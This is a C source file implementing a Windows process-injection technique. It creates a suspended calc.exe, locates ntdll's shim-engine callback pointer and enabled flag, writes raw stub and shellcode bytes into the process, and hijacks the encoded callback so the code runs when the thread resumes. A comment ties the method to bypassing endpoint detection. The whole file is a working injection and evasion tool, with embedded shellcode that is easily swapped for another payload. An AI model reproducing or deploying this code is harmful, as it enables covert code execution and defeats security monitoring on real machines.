/*
   
*/


#include <Windows.h>
#include <stdio.h>
#define TARGET_PROCESS "calc.exe"


BYTE x64_stub[] =  "\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x18\x48"
                    "\x8d\x52\x20\x52\x48\x8b\x12\x48\x8b\x12\x48\x3b\x14\x24\x0f\x84"
                    "\x85\x00\x00\x00\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x83\xc1"
                    "\x0a\x48\x83\xe1\xf0\x48\x29\xcc\x49\x89\xc9\x48\x31\xc9\x48\x31"
                    "\xc0\x66\xad\x38\xe0\x74\x12\x3c\x61\x7d\x06\x3c\x41\x7c\x02\x04"
                    "\x20\x88\x04\x0c\x48\xff\xc1\xeb\xe5\xc6\x04\x0c\x00\x48\x89\xe6"
                    "\xe8\xfe\x00\x00\x00\x4c\x01\xcc\x48\xbe\xed\xb5\xd3\x22\xb5\xd2"
                    "\x77\x03\x48\x39\xfe\x74\xa0\x48\xbe\x75\xee\x40\x70\x36\xe9\x37"
                    "\xd5\x48\x39\xfe\x74\x91\x48\xbe\x2b\x95\x21\xa7\x74\x12\xd7\x02"
                    "\x48\x39\xfe\x74\x82\xe8\x05\x00\x00\x00\xe9\xbc\x00\x00\x00\x58"
                    "\x48\x89\x42\x30\xe9\x6e\xff\xff\xff\x5a\x48\xb8\x11\x11\x11\x11"
                    "\x11\x11\x11\x11\xc6\x00\x00\x48\x8b\x12\x48\x8b\x12\x48\x8b\x52"
                    "\x20\x48\x31\xc0\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02"
                    "\x0f\x85\x83\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x01\xd0\x50"
                    "\x4d\x31\xdb\x44\x8b\x58\x20\x49\x01\xd3\x48\x31\xc9\x8b\x48\x18"
                    "\x51\x48\x85\xc9\x74\x69\x48\x31\xf6\x41\x8b\x33\x48\x01\xd6\xe8"
                    "\x5f\x00\x00\x00\x49\x83\xc3\x04\x48\xff\xc9\x48\xbe\x38\x22\x61"
                    "\xd4\x7c\xdf\x63\x99\x48\x39\xfe\x75\xd7\x58\xff\xc1\x29\xc8\x91"
                    "\x58\x44\x8b\x58\x24\x49\x01\xd3\x66\x41\x8b\x0c\x4b\x44\x8b\x58"
                    "\x1c\x49\x01\xd3\x41\x8b\x04\x8b\x48\x01\xd0\xeb\x43\x48\xc7\xc1"
                    "\xfe\xff\xff\xff\x5a\x4d\x31\xc0\x4d\x31\xc9\x41\x51\x41\x51\x48"
                    "\x83\xec\x20\xff\xd0\x48\x83\xc4\x30\x5f\x5e\x48\x31\xc0\xc3\x59"
                    "\x58\xeb\xf6\xbf\x05\x15\x00\x00\x48\x31\xc0\xac\x38\xe0\x74\x0f"
                    "\x49\x89\xf8\x48\xc1\xe7\x05\x4c\x01\xc7\x48\x01\xc7\xeb\xe9\xc3"
                    "\xe8\xb8\xff\xff\xff";


/* Ex: msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f c ) */
BYTE x64_shellcode[] =  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


/* Stolen from -> https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html */
LPVOID encode_system_ptr(LPVOID ptr) {
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

LPVOID find_pattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize)
{
    if ( dwSize > dwPatternSize ) // Avoid OOB
        while ( (dwSize--) - dwPatternSize ) {
            if ( RtlCompareMemory(pBuffer, pPattern, dwPatternSize) == dwPatternSize )
                return pBuffer;

            pBuffer++;
        }

    return NULL;
}

LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress) {
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwTextPtr;
    DWORD_PTR dwMRDataPtr;
    DWORD_PTR dwResultPtr;

    /* Nt Headers */
    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while ( dwValue-- ) {
        /* Save .text section header */
        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
            dwTextPtr = dwPtr;

        /* Find .mrdata section address */
        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
            dwMRDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;    

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    /* Points to the beginning of .text section */
    dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;

    /* The end of .text section */
    dwTextPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;

    /*
        We are searching for this pattern:
        8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
        8bc2                 mov     eax, edx
        488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
    */
    
    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B", 11) ) {
        /* Get the offset address */
        dwResultPtr += 12;

        /* Ensure the validity of the opcode we rely on */
        if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) {
            /* Set the offset address */
            if ( ppOffsetAddress )
                ( *ppOffsetAddress ) = (LPVOID) dwResultPtr;

            /* Fetch the address */
            dwPtr = (DWORD_PTR) ( *(DWORD32 *) dwResultPtr ) + dwResultPtr + 0x4;

            /* Is that address in the range we expect!? */
            if ( dwPtr > dwMRDataPtr+0x240 && dwPtr < dwMRDataPtr+0x280 )
                return (LPVOID) dwPtr;
        }
    }

    return NULL;
}

LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwEndPtr;
    DWORD_PTR dwDataPtr;

    /* Nt Headers */
    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while (dwValue--) {
        /* Find .data section address */
        if (strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".data") == 0) {
            dwDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;  
            printf("[DEBUG] .data section found at address: 0x%p\n", (LPVOID)dwDataPtr);
            break; 
        } 

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    if (!dwDataPtr) {
        printf("[ERROR] .data section not found!\n");
        return NULL;
    }

    /* Searching from the address where we found the offset of SE_DllLoadedAddress */
    dwPtr = dwEndPtr = (DWORD_PTR) pDllLoadedOffsetAddress;

    /* End of block we are searching in */
    dwEndPtr += 0xFF;

    printf("[DEBUG] Scanning .data section from: 0x%p to 0x%p\n", (LPVOID)dwPtr, (LPVOID)dwEndPtr);

    /*
        We are looking for this pattern:
        443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
        49391c ?? c8
        $+79174          | 49:391CC8                | cmp qword ptr ds:[r8+rcx*8],rbx         |
        $+79178          | 49:8D14C8                | lea rdx,qword ptr ds:[r8+rcx*8]         |
    */

    while (dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, "\x49\x39\x1c", 3)) {
        /* Jump into the offset */
        dwPtr += 0x3;
        
        /* Ensure the validity of the opcode we rely on */
        if ((*(BYTE *)(dwPtr + 0x3)) == 0x00) {
            /* Fetch the address - Server 2019 fix*/ 
            dwResultPtr = (DWORD_PTR)(*(DWORD32 *)dwPtr) + dwPtr + 0x4;            

            /* Debug information - Server 2019 fix*/
            printf("[DEBUG] Pattern found at: 0x%p\n", (LPVOID)(dwPtr - 0x3));
            printf("[DEBUG] Opcode at offset 0x3: 0x%02x\n", *(BYTE *)(dwPtr + 0x3));
            printf("[DEBUG] Candidate address: 0x%p\n", (LPVOID)dwResultPtr);

            /* Is that address in the range we expect!? - Server 2019 fix*/
            if (dwResultPtr > dwDataPtr && dwResultPtr < dwDataPtr + 0x8000) {
                printf("[DEBUG] Valid g_ShimsEnabled address found at: 0x%p\n", (LPVOID)dwResultPtr);
                return (LPVOID)dwResultPtr;
            } else {
                printf("[DEBUG] Candidate address rejected: 0x%p\n", (LPVOID)dwResultPtr);
            }
        }
    }

    printf("[ERROR] Failed to locate g_ShimsEnabled address!\n");
    return NULL;
}



int main(int argc, char **argv) {
    HANDLE hNtDLL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    LPVOID pBuffer;
    LPVOID pShimsEnabledAddress;
    LPVOID pSE_DllLoadedAddress;
    LPVOID pPtr;
    int nSuccess = EXIT_FAILURE;
    BOOL bEnable = TRUE;

    si.cb = sizeof( STARTUPINFOA );
        
    printf("[*] Create a process in suspended mode ( %s )\n", TARGET_PROCESS);

    if ( !CreateProcessA(
        NULL, 
        TARGET_PROCESS, 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED, 
        NULL, 
        (LPCSTR) "C:\\Windows\\System32\\", 
        &si, 
        &pi
    ) )
        return nSuccess;

    puts( "[+] The process has been created successfully" );

    puts( "[*] Getting a handle on NtDLL" );
    hNtDLL = GetModuleHandleA( "NtDLL" );
    printf( "[+] NtDLL Base Address = 0x%p\n", hNtDLL );

    puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
    pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
    printf( "[+] Found the Callback Address at 0x%p\n", pSE_DllLoadedAddress );

    puts( "[*] Dynamically Search for the Enabling Flag Address ( g_ShimsEnabled )");
    pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );
    printf( "[+] Found the Enabling Flag Address at 0x%p\n", pShimsEnabledAddress );

    do {

        puts( "[*] Remotley allocate memory for both stub & shellcode" );
        if ( !(pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(x64_stub) + sizeof(x64_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) )
            break;

        /* Shellcode address */
        pPtr = (LPVOID)( (DWORD_PTR) pBuffer + sizeof(x64_stub) );

        printf( "[+] Our stub will be injected at 0x%p\n", pBuffer );
        printf( "[+] Our shellcode will be injected at 0x%p\n", pPtr );

        /* Tell the stub where the enabling flag is located */
        RtlCopyMemory( find_pattern(x64_stub, sizeof(x64_stub), "\x11\x11\x11\x11\x11\x11\x11\x11", 8), &pShimsEnabledAddress, sizeof(LPVOID) );

        puts( "[*] Injecting our cascade stub" );
        if ( !WriteProcessMemory(pi.hProcess, pBuffer, x64_stub, sizeof(x64_stub), NULL) )
            break;

        puts( "[+] Our stub has been successfully injected into the remote process" );

        puts( "[*] Injecting our Shellcode" );
        if ( !WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub)), x64_shellcode, sizeof(x64_shellcode), NULL) )
            break;

        puts( "[+] Our Shellcode has been successfully injected into the remote process" );

        pPtr = encode_system_ptr((LPVOID) pBuffer);
        printf( "[*] The Callback Address has been encoded to 0x%p\n", pPtr );

        puts ("[*] Hijacking the Callback for making it executes our stub" );
        if ( !WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID) &pPtr, sizeof(LPVOID), NULL) )
            break;

        puts( "[+] Hijacking has been done successfully" );

        puts( "[*] Enabling Shim Engine for triggering our stub later" );
        if ( !WriteProcessMemory(pi.hProcess, pShimsEnabledAddress, (LPCVOID) &bEnable, sizeof(BOOL), NULL) )
            break;

        puts( "[+] Shim Engine is enabled now" );
        
        puts( "[*] Triggering the callback" );
        if ( !ResumeThread(pi.hThread) )
            break;

        puts( "[+] Injection has been done successfully" );
        nSuccess = EXIT_SUCCESS;

    } while( FALSE );

    if ( nSuccess == EXIT_FAILURE )
        puts( "[-] Unfortunately, failed to cascade the process!" );

    puts( "[*] Cleaning up" );
    if ( pi.hThread )
        CloseHandle( pi.hThread );

    if ( pi.hProcess )
        CloseHandle( pi.hProcess );

    return nSuccess;
}
